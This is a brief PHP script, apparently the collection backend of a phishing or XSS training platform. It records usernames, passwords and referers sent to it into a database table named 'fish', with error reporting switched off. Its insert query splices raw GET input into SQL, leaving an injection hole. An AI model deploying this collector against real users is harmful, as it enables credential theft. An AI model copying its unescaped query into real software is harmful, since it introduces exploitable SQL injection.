<?php
error_reporting(0);
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();



if(!empty($_GET['username']) && !empty($_GET['password'])){

    $username=$_GET['username'];
    $password=$_GET['password'];
    $referer="";
    $referer.=$_SERVER['HTTP_REFERER'];
    $time=date('Y-m-d g:i:s');
    $query="insert fish(time,username,password,referer) 
    values('$time','$username','$password','$referer')";
    $result=mysqli_query($link, $query);
}

?>